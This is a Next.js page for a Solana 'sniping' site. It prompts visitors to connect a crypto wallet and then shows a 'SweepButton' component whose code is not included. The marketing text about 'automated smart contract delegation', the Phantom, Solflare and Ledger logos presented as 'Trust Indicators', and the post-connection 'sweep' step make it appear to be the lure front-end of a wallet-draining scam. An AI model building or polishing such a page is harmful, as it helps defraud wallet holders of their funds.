"use client";
import React from "react";
import Image from "next/image";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal } from "@solana/wallet-adapter-react-ui";
import { IoWalletOutline } from "react-icons/io5";
import SweepButton from "@/components/SweepButton";

export default function Home() {
  const { connected, publicKey } = useWallet();
  const { setVisible } = useWalletModal();

  return (
    <main className="relative w-full h-screen flex flex-col items-center justify-center overflow-hidden bgi">
      {/* Background Glows */}
      <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-[#8F00FF]/20 blur-[120px] rounded-full" />
      <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-[#14F195]/10 blur-[120px] rounded-full" />

      <section className="z-10 flex flex-col items-center text-center px-6 max-w-4xl">
        {/* Logo Replacement / Placeholder */}
        <div className="mb-8 animate-pulse">
          <Image 
            src="/Asnipenew.png" 
            alt="Logo" 
            width={80} 
            height={80} 
            className="drop-shadow-[0_0_15px_rgba(143,0,255,0.5)]"
          />
        </div>

        <h1 className="text-5xl md:text-7xl font-extrabold mb-6 tracking-tight">
          <span className="gradient-text">Master the</span> <br />
          <span className="gradient-text2">Solana Ecosystem</span>
        </h1>

        <p className="text-gray-400 text-lg md:text-xl mb-10 max-w-2xl leading-relaxed">
          Connect your wallet to access high-speed sniping and automated smart contract delegation. 
          The ultimate terminal for professional traders.
        </p>

        <div className="w-full flex justify-center">
          {!connected ? (
            <button
              onClick={() => setVisible(true)}
              className="group relative flex items-center gap-3 bg-[#36013F] hover:bg-[#4a0257] px-10 py-5 rounded-2xl font-bold text-2xl transition-all duration-300 shadow-[0_0_20px_rgba(35,15,255,0.3)] hover:shadow-[0_0_30px_rgba(252,87,255,0.5)] border border-[#fc57ff]/30"
            >
              <IoWalletOutline className="text-3xl group-hover:rotate-12 transition-transform" />
              Connect Wallet
            </button>
          ) : (
            <div className="flex flex-col items-center gap-6 w-full animate-in fade-in zoom-in duration-500">
              <div className="bg-[#1C1D22] border border-[#fc57ff]/20 px-6 py-3 rounded-full font-mono text-sm text-[#fc57ff]">
                Connected: {publicKey.toString().slice(0, 4)}...{publicKey.toString().slice(-4)}
              </div>
              
              {/* This is your existing brain logic styled for the new UI */}
              <div className="w-full max-w-md">
                <SweepButton />
              </div>
            </div>
          )}
        </div>

        {/* Floating Icons (Trust Indicators) */}
        <div className="mt-16 flex gap-8 opacity-50 grayscale hover:grayscale-0 transition-all">
           <Image src="/phantom.png" alt="Phantom" width={30} height={30} />
           <Image src="/solflare.png" alt="Solflare" width={30} height={30} />
           <Image src="/ledgerlive.png" alt="Ledger" width={30} height={30} />
        </div>
      </section>

      {/* Footer Branding */}
      <footer className="absolute bottom-8 text-gray-500 text-xs tracking-widest uppercase">
        Powered by Nuah Protocol &bull; 2026
      </footer>
    </main>
  );
}
